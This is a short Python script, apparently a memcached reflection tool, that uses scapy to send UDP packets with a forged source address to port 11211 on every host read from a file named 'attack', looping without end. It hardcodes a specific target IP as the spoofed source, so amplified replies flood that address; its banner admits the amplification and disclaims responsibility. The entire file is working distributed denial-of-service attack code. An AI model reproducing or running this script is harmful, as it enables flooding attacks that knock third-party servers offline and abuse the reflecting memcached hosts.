#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout
import socket

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

####################################### DISCLAIMER ########################################
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
'''
print(logo)


def verify(host):
    try:
        #target = "47.251.15.247"
        target = "74.120.175.75"
        targetport = 80
        data = "\x00\x00\x00\x00\x00\x01\x00\x00get drdos\r\n" 
        print('[+] Sending 2 forged synchronized payloads to: %s' % (host))
        with suppress_stdout():
            send(IP(src=target, dst=host) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=5)
    except socket.timeout:
        pass

if __name__ == '__main__':
    while True:
        with open('attack') as file:
            for line in file:
                verify(line.rstrip('\n'))

